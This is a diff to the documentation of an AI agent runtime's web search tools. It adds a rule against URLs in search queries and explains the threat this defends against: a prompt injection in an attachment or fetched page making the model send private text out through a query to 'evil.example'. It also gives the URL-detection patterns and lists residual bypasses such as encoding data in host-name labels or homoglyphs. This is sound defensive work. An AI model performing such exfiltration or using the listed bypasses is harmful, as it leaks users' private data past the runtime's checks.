@@ -308,7 +308,8 @@ Run parameters:
 - `webSearch` (default off): registers both tools and their prompt guidelines
   (search only for current or outside information; search once with one
   precise query and again only if the results are insufficient, at most 3
-  times; prefer the search summary to reading pages; cite the sources used as
+  times; a query is words, never a URL, with `site:example.com` to search one
+  site; prefer the search summary to reading pages; cite the sources used as
   Markdown links). Compaction runs register them too but never call them.
 - `allowedWebUrls` (default none): the HTTPS pages `web_fetch` may read,
   usually the URLs in the user's messages and the sources of earlier answers.
@@ -341,7 +342,8 @@ Events: `tool_start` is `{name, toolCallId, args}` with `args` `{query}` or
 server's (see the search-mcp README) and the runtime's own:
 `search_unavailable` (the server could not start, or stopped; nothing was
 sent; a later call starts it again), `search_rejected`/`fetch_rejected` (the
-server rejected the arguments), `search_failed` without `status` also when the
+server rejected the arguments; `search_rejected` also for a query with a URL,
+see below), `search_failed` without `status` also when the
 server answered with a JSON-RPC error (it never ran the search),
 `fetch_not_allowed` (also: the URL is not allowed in this run), and the
 run's budget: `search_limit_reached` (the run already made 3 searches that
@@ -350,6 +352,26 @@ failed, refusals included). Both are ordinary failures without a request:
 they tell the model to answer with what it has, and the run goes on.
 Source URLs are passed on as the server returns them; `inputTokens` and
 `outputTokens` are `null` when the gateway did not report them.
+
+URLs in queries: the gateway's search model opens pages itself (`open_page`
+items), so a query naming a URL would reach that URL past `web_fetch`'s
+allowlist. A prompt injection in an attachment or a fetched page could then
+send private text out as `web_search("https://evil.example/c?d=<text>")`. A
+query with any scheme (`\w+://`), a `www.` host, or a host name or IPv4
+address followed by a path or query string (`example.com/…`,
+`example.com?…`) therefore fails with `search_rejected` before any request:
+an ordinary failure that does not count toward the 3 searches. The server
+refuses the same queries again, and its instruction tells the search model
+never to open a URL that appears in the query. A bare domain and
+`site:example.com` stay allowed, and so does a dotted name before a closing
+question mark ("Node.js?"); a dotted name before a slash ("Node.js/Deno") is
+refused, and the model is told to search with words instead. Residual risk:
+text can still leave in a host name's labels (`<text>.evil.example`, as a
+bare domain), in an address the check does not read as one (`evil[.]example
+/c`, spaces, homoglyphs), or if the search model opens a page anyway; and the
+query itself always reaches the gateway and its search provider. The
+allowlist bounds what `web_fetch` reads; the search model's own page opens are
+bounded only by these checks and its instruction.
 
 Billing: every `web_search` success is `usage.searchCalls` paid searches at
 the web_search price of `usage.model`, plus its tokens. The server asks for
